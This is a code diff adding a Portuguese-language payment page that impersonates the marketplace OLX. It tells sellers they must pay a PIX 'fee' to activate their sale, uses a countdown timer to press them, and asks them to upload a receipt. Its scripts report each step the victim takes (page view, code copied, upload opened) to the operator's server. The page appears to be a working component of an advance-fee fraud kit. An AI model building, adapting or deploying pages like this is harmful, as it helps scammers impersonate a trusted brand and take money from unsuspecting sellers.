@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagamento PIX</title>
+  <style>                                         /* SEU CSS ORIGINAL - NENHUMA ALTERAÇÃO NECESSÁRIA */                                       * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f5f5f5; color: #333; overflow-x: hidden; height: 100vh; overflow-y: auto; }
+    .container { max-width: 400px; margin: 0 auto; background-color: white; min-height: 100vh; position: relative; display: flex; flex-direction: column; }
+    .header { background-color: white; padding: 8px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); flex-shrink: 0; }
+    .header img { width: 100px; height: 40px; object-fit: contain; }
+    .content { padding: 10px; flex: 1; display: flex; flex-direction: column; }
+    .alert { background-color: #e3f2fd; border-left: 4px solid #2196f3; padding: 6px; margin: 6px 0; text-align: left; border-radius: 0 8px 8px 0; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 100%; display: flex; align-items: flex-start; gap: 8px; }
+    .alert-icon { width: 18px; height: 18px; background-color: #2196f3; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 11px; flex-shrink: 0; }
+    .alert-text { font-size: 12px; color: #067ff8; line-height: 1.3; }
+    .timer-container { margin: 6px 0; padding: 8px; background: rgba(190, 189, 189, 0.274); border-radius: 10px; }
+    .timer-display { text-align: center; font-size: 13px; font-weight: 600; color: #1b1b1b; margin-bottom: 6px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .timer-bar-container { background-color: rgba(255, 255, 255, 0); height: 8px; border-radius: 4px; overflow: hidden; position: relative; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); }
+    .timer-bar { background: #ff8c00; height: 100%; width: 100%; transition: width 1s linear; border-radius: 4px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+    .payment-section { text-align: center; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 20px; }
+    .payment-section img { width: 90px; height: 40px; object-fit: contain; }
+    .payment-amount { font-size: 20px; font-weight: 700; color: #0b0e0d; text-shadow: 0 1px 2px rgba(0,0,0,0.1); padding: 6px 12px; width: 50%; }
+    .instructions { text-align: left; margin-bottom: 8px; }
+    .instruction-title { font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #333; }
+    .instruction-step { font-size: 12px; color: #666; margin-bottom: 4px; line-height: 1.3; }
+    .qr-code { text-align: center; margin: 8px 0; }
+    .qr-code img { width: 140px; height: 140px; object-fit: cover; border: 1px solid #ddd; border-radius: 6px; }
+    .verify-payment { font-size: 12px; color: #666; text-align: center; margin: 6px 0; }
+    .copy-paste-section { margin: 8px 0; flex-shrink: 0; }
+    .copy-paste-title { font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #333; }
+    .copy-paste-subtitle { font-size: 12px; color: #666; margin-bottom: 8px; line-height: 1.3; }
+    .pix-code-container { background-color: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; padding: 8px; margin-bottom: 8px; position: relative; }
+    .pix-code { font-family: monospace; font-size: 10px; color: #666; word-break: break-all; line-height: 1.2; margin-bottom: 6px; min-height: 25px; overflow: hidden; position: relative; }
+    .copy-button { background-color: #ff8c00; color: white; border: none; border-radius: 6px; padding: 8px; width: 100%; font-size: 13px; font-weight: 600; cursor: pointer; transition: background-color 0.3s; }
+    .copy-button:hover { background-color: #e67e00; }
+    .generate-pix-button { background-color: #6c757d; color: white; border: none; border-radius: 6px; padding: 8px; width: 100%; font-size: 13px; font-weight: 600; cursor: pointer; margin-top: 6px; transition: background-color 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; }
+    .generate-pix-button:hover { background-color: #5a6268; }
+    .generate-pix-button:disabled { background-color: #ccc; cursor: not-allowed; }
+    .loading-spinner { width: 16px; height: 16px; border: 2px solid transparent; border-top: 2px solid white; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .submit-proof-button { background-color: #007bff; color: white; border: none; border-radius: 6px; padding: 8px; width: 100%; font-size: 13px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.3s; opacity: 1; pointer-events: all; }
+    .submit-proof-button:hover { background-color: #0056b3; }
+    /* Modal CSS */
+    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); }
+    .modal-content { background-color: white; margin: 20px auto; padding: 25px; border-radius: 12px; width: 90%; max-width: 380px; position: relative; max-height: 90vh; overflow-y: auto; }
+    .modal-header { text-align: center; margin-bottom: 20px; }
+    .modal-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 12px; }
+    .modal-subtitle { background-color: #fff3e0; border-left: 4px solid #ff9800; padding: 8px; margin: 10px 0; text-align: left; border-radius: 0 8px 8px 0; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 100%; font-size: 13px; color: #ef6c00; line-height: 1.4; font-weight: 500; }
+    .file-upload { border: 2px dashed #ddd; border-radius: 8px; padding: 20px; text-align: center; margin: 15px 0; cursor: pointer; transition: border-color 0.3s; }
+    .file-upload:hover { border-color: #007bff; }
+    .file-upload.dragover { border-color: #007bff; background-color: #f8f9fa; }
+    .upload-icon { font-size: 18px; color: #666; margin-bottom: 6px; }
+    .upload-text { font-size: 12px; color: #666; line-height: 1.3; }
+    .file-input { display: none; }
+    .selected-file { background-color: #e8f5e8; border-left: 4px solid #4caf50; padding: 8px; margin: 10px 0; text-align: left; border-radius: 0 8px 8px 0; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 100%; font-size: 13px; color: #2e7d32; }
+    .modal-buttons { display: flex; gap: 10px; margin-top: 20px; }
+    .modal-button { flex: 1; padding: 12px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background-color 0.3s; }
+    .modal-button.cancel { background-color: #f8f9fa; color: #666; border: 1px solid #ddd; }
+    .modal-button.cancel:hover { background-color: #e9ecef; }
+    .modal-button.confirm { background-color: #28a745; color: white; }
+    .modal-button.confirm:hover { background-color: #218838; }
+    .modal-button.confirm:disabled { background-color: #ccc; cursor: not-allowed; }
+    .close { position: absolute; right: 15px; top: 15px; font-size: 20px; color: #666; cursor: pointer; }
+    .close:hover { color: #333; }
+    /* Toast notification */
+    .toast { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #28a745; color: white; padding: 12px 20px; border-radius: 8px; font-size: 14px; font-weight: 500; z-index: 2000; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: none; animation: toastFadeIn 0.3s ease-out; }
+    @keyframes toastFadeIn { from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }
+    .toast.error { background-color: #dc3545; }
+    /* Progress Bar for Upload */
+    .upload-progress { width: 100%; background-color: #e9ecef; border-radius: 4px; margin: 10px 0; display: none; }
+    .upload-progress-bar { height: 10px; width: 0%; background-color: #28a745; border-radius: 4px; transition: width 0.3s ease; text-align: center; color: white; font-size: 8px; line-height: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+      <div class="header">
+                      <img src="https://logodownload.org/wp-content/uploads/2016/10/olx-logo-8.png" alt="OLX Logo">
+                </div>
+
+      <div class="content">
+          <div class="alert">
+              <div class="alert-icon">!</div>
+              <div class="alert-text">
+                 <p>Para ativar sua venda, é <strong>obrigatório</strong> enviar o comprovante após o pagamento da taxa.</p>
+              </div>
+          </div>
+
+          <div class="timer-container">
+              <div class="timer-display">
+                  Seu código expira em: <span id="countdown" style="color: #f76008; font-weight: 700;">10:00</span>
+              </div>
+              <div class="timer-bar-container">
+                  <div class="timer-bar" id="timerBar"></div>
+              </div>
+          </div>
+
+          <div class="payment-section">
+              <img src="https://img.icons8.com/color/512/pix.png" alt="pix-logo">
+               <div class="payment-amount">VALOR R$ {{valorTaxa}}</div>
+          </div>
+
+          <div class="instructions">
+              <div class="instruction-title">É rápido e prático. Veja como é fácil:</div>
+              <div class="instruction-step">1. Abra o app do banco de sua preferência, escolha a opção pagar via Pix</div>
+              <div class="instruction-step">2. Escolha pagar Pix com QR Code e escaneie o código abaixo</div>
+
+              <div class="qr-code">
+                    <img id="qrCodeImage" src="" alt="QR Code Pix" />
+              </div>
+
+              <div class="verify-payment">3. Confira todas as informações e confirme o pagamento</div>
+          </div>
+
+          <div class="copy-paste-section">
+              <div class="copy-paste-title">Ou se preferir, faça o pagamento com o Pix copia e cola</div>
+              <div class="copy-paste-subtitle">
+                  Acesse o app do seu banco ou Internet Banking, escolha a opção pagar com Pix copia e cola. Depois cole o código, confira todas as informações e confirme o pagamento.
+              </div>
+
+              <div class="pix-code-container">
+                 
+
+                <!-- PIX Copia e Cola -->
+                <div class="pix-code" id="pixCode">{{codigoPagamento}}</div>
+                  <button class="copy-button" onclick="copiarPix()">📋 Copiar código Pix</button>
+                  <button class="generate-pix-button" id="generatePixBtn" onclick="generateNewPix()">
+                      <div class="loading-spinner" id="loadingSpinner"></div>
+                      <span id="generatePixText">🔄 Gerar Novo PIX</span>
+                  </button>
+              </div>
+
+              <button class="submit-proof-button" id="submitProofBtn" onclick="openModal()">
+                  📎 Enviar Comprovante
+              </button>
+          </div>
+      </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <div id="proofModal" class="modal">
+      <div class="modal-content">
+          <span class="close" onclick="closeModal()">&times;</span>
+          <div class="modal-header">
+              <div class="modal-title">Enviar Comprovante de Pagamento</div>
+              <div class="modal-subtitle">
+                  <strong>ATENÇÃO:</strong> Para confirmar seu pagamento, é OBRIGATÓRIO enviar o comprovante através deste site. Anexe a imagem ou PDF do seu comprovante de pagamento PIX para garantir o processamento do seu pedido.
+              </div>
+          </div>
+
+          <div class="file-upload" id="fileUploadArea" onclick="document.getElementById('fileInput').click()" ondragover="handleDragOver(event)" ondragleave="handleDragLeave(event)" ondrop="handleDrop(event)">
+              <div class="upload-icon">📎</div>
+              <div class="upload-text">
+                  Clique aqui para selecionar o arquivo<br>
+                  ou arraste e solte o comprovante
+              </div>
+          </div>
+
+          <input type="file" id="fileInput" class="file-input" accept="image/*,.pdf" onchange="handleFileSelect(event)">
+
+          <div id="selectedFile" class="selected-file" style="display: none;"></div>
+
+          <div class="upload-progress" id="uploadProgress">
+              <div class="upload-progress-bar" id="uploadProgressBar"></div>
+          </div>
+
+          <div class="modal-buttons">
+              <button class="modal-button cancel" onclick="closeModal()">Cancelar</button>
+              <button class="modal-button confirm" id="confirmButton" onclick="submitProof()" disabled>Enviar Comprovante</button>
+          </div>
+      </div>
+  </div>
+
+  <script>
+    // --- VARIÁVEIS DE ESTADO E CONFIGURAÇÃO ---
+    const jsonUrl = "src/PQNZGHRYPZ.json";
+const codProtocolo = "PQNZGHRYPZ";
+const idTransacao = "PQNZGHRYPZ";
+
+    let timerInterval;
+    let countdownTime = 600; // 10 minutos
+    const totalTime = 600;
+    let selectedFile = null;
+
+    // --- ELEMENTOS DO DOM ---
+    const countdownEl = document.getElementById('countdown');
+    const timerBarEl = document.getElementById('timerBar');
+    const qrCodeImageEl = document.getElementById('qrCodeImage');
+    const pixCodeEl = document.getElementById('pixCode');
+    const generatePixBtn = document.getElementById('generatePixBtn');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    const generatePixText = document.getElementById('generatePixText');
+    const modal = document.getElementById('proofModal');
+    const confirmButton = document.getElementById('confirmButton');
+    const selectedFileEl = document.getElementById('selectedFile');
+    const fileUploadArea = document.getElementById('fileUploadArea');
+    document.addEventListener('DOMContentLoaded', () => {
+  atualizarQRCode();
+  startTimer();
+});
+    // --- FUNÇÕES DE LÓGICA PRINCIPAL ---
+
+    function startTimer() {
+        clearInterval(timerInterval);
+        countdownTime = 600;
+        timerInterval = setInterval(() => {
+            if (countdownTime <= 0) {
+                clearInterval(timerInterval);
+                countdownEl.textContent = "Expirado!";
+                timerBarEl.style.width = '0%';
+                generatePixBtn.disabled = false; // Permite gerar um novo
+                return;
+            }
+            countdownTime--;
+            const minutes = Math.floor(countdownTime / 60).toString().padStart(2, '0');
+            const seconds = (countdownTime % 60).toString().padStart(2, '0');
+            countdownEl.textContent = `${minutes}m ${seconds}s`;
+            timerBarEl.style.width = (countdownTime / totalTime) * 100 + '%';
+        }, 1000);
+    }
+
+    function showToast(message, isError = false) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.className = 'toast';
+        if (isError) {
+            toast.classList.add('error');
+        }
+        toast.style.display = 'block';
+        setTimeout(() => {
+            toast.style.display = 'none';
+        }, 3000);
+    }
+
+    async function atualizarQRCode() {
+    const id = new URLSearchParams(window.location.search).get("id");
+    if (!id) {
+      console.warn("ID ausente na URL.");
+      return;
+    }
+
+    try {
+      const response = await fetch(`/qrcode-base64?id=${id}&v=${Date.now()}`, { cache: "no-store" });
+      const data = await response.json();
+
+      // Atualiza a imagem QR code (base64)
+      if (data.qrBase64) {
+        const qrImage = document.getElementById("qrCodeImage");
+        if (qrImage) qrImage.src = data.qrBase64;
+      }
+
+      // Atualiza o texto do código Pix
+      if (data.codigoPagamento) {
+        const pixText = document.getElementById("pixCode");
+        if (pixText) pixText.textContent = data.codigoPagamento;
+      }
+
+    } catch (error) {
+      console.error("Erro ao buscar QR Code atualizado:", error);
+    }
+  }
+    
+  async function generateNewPix() {
+    const generatePixBtn = document.getElementById("generatePixBtn");
+    const loadingSpinner = document.getElementById("loadingSpinner");
+    const generatePixText = document.getElementById("generatePixText");
+    const pixCodeEl = document.getElementById("pixCode");
+
+    // Captura o ID da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get("id");
+
+    if (!id) {
+      showToast("❌ ID ausente na URL. Não foi possível gerar novo Pix.", true);
+      return;
+    }
+
+    const jsonUrl = `/qrcode-info?id=${id}`;
+
+    generatePixBtn.disabled = true;
+    loadingSpinner.style.display = 'block';
+    generatePixText.textContent = 'Gerando...';
+
+    try {
+      const response = await fetch(`${jsonUrl}&v=${Date.now()}`, { cache: "no-store" });
+      if (!response.ok) throw new Error("Erro ao buscar novo código Pix");
+
+      const data = await response.json();
+
+      // Atualiza o texto do código Pix na tela
+      if (data.codigoPagamento && pixCodeEl) {
+        pixCodeEl.textContent = data.codigoPagamento;
+        showToast('✓ Novo código PIX carregado com sucesso!');
+        startTimer();
+      } else {
+        showToast('⚠️ Código não encontrado para este ID.', true);
+      }
+
+    } catch (error) {
+      console.error("Erro ao buscar novo Pix:", error);
+      showToast('Erro ao gerar novo PIX. Tente novamente.', true);
+    } finally {
+      generatePixBtn.disabled = false;
+      loadingSpinner.style.display = 'none';
+      generatePixText.textContent = '🔄 Gerar Novo PIX';
+    }
+  }
+
+    function copiarPix() {
+  const pixCode = document.getElementById('pixCode').textContent;
+  const urlParams = new URLSearchParams(window.location.search);
+  const id = urlParams.get("id");
+
+  navigator.clipboard.writeText(pixCode).then(() => {
+    alert("Código Pix copiado com sucesso!");
+
+    // Notificar backend
+    fetch(`/copiado?id=${id}`, {
+      method: "POST"
+    });
+  });
+}
+
+    // --- FUNÇÕES DO MODAL E UPLOAD ---
+
+    function openModal() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const id = urlParams.get("id");
+
+  // Notifica backend que o usuário abriu o modal (intenção de enviar comprovante)
+  fetch(`/avisar-intencao?id=${id}`)
+    .catch(console.error);
+
+  modal.style.display = 'block';
+}
+
+    function closeModal() {
+        modal.style.display = 'none';
+        selectedFile = null;
+        selectedFileEl.style.display = 'none';
+        selectedFileEl.textContent = '';
+        confirmButton.disabled = true;
+        document.getElementById('uploadProgress').style.display = 'none';
+        document.getElementById('uploadProgressBar').style.width = '0%';
+    }
+
+    function handleFileSelect(event) {
+        const file = event.target.files[0];
+        if (file) {
+            selectedFile = file;
+            selectedFileEl.textContent = `Arquivo selecionado: ${file.name}`;
+            selectedFileEl.style.display = 'block';
+            confirmButton.disabled = false;
+        }
+    }
+
+    function handleDragOver(event) {
+        event.preventDefault();
+        fileUploadArea.classList.add('dragover');
+    }
+
+    function handleDragLeave(event) {
+        event.preventDefault();
+        fileUploadArea.classList.remove('dragover');
+    }
+
+    function handleDrop(event) {
+        event.preventDefault();
+        fileUploadArea.classList.remove('dragover');
+        const file = event.dataTransfer.files[0];
+        if (file) {
+            selectedFile = file;
+            selectedFileEl.textContent = `Arquivo selecionado: ${file.name}`;
+            selectedFileEl.style.display = 'block';
+            confirmButton.disabled = false;
+        }
+    }
+
+ async function submitProof() {
+    if (!selectedFile) {
+        showToast('Por favor, selecione um arquivo.', true);
+        return;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const idTransacao = urlParams.get("id");
+
+    if (!idTransacao) {
+        showToast('ID da transação não encontrado.', true);
+        return;
+    }
+
+    const formData = new FormData();
+    const randomFileName = `${Date.now()}-${Math.random().toString(36).substring(2, 9)}.${selectedFile.name.split('.').pop()}`;
+    formData.append('file', selectedFile, randomFileName);
+
+    confirmButton.disabled = true;
+    confirmButton.textContent = 'Enviando...';
+
+    const uploadProgress = document.getElementById('uploadProgress');
+    const uploadProgressBar = document.getElementById('uploadProgressBar');
+    uploadProgress.style.display = 'block';
+    uploadProgressBar.style.width = '0%';
+
+    try {
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+            progress += 10;
+            if (progress < 90) {
+                uploadProgressBar.style.width = `${progress}%`;
+            }
+        }, 200);
+
+        // Envia o comprovante para o servidor Node.js
+        const response = await fetch(`/enviar-comprovante?id=${idTransacao}`, {
+            method: 'POST',
+            body: formData
+        });
+
+        clearInterval(progressInterval);
+        uploadProgressBar.style.width = '100%';
+
+        const result = await response.json();
+
+        if (result.status === true) {
+            showToast('Comprovante enviado com sucesso!');
+            setTimeout(() => {
+                document.body.innerHTML = `
+                  <div style="text-align: center; padding: 50px; font-size: 20px;">
+                    <h1>Obrigado!</h1>
+                    <p>Seu comprovante foi recebido e está em análise.</p>
+                  </div>`;
+            }, 1500);
+        } else {
+            throw new Error(result.message || 'Erro no servidor ao processar o envio.');
+        }
+
+    } catch (error) {
+        console.error('Erro no upload:', error);
+        showToast(error.message || 'Erro ao enviar. Tente novamente.', true);
+        confirmButton.disabled = false;
+        confirmButton.textContent = 'Enviar Comprovante';
+        uploadProgress.style.display = 'none';
+    }
+}
+
+    // --- INICIALIZAÇÃO ---
+
+    // Fecha o modal se clicar fora dele
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            closeModal();
+        }
+    }
+
+    // Inicia o timer e o polling de atualizações quando a página carrega
+    const urlParams = new URLSearchParams(window.location.search);
+const id = urlParams.get("id");
+
+fetch(`/avisar-visualizacao?id=${id}`, {
+  method: "POST"
+}).catch(console.error);
+  </script>
+</body>
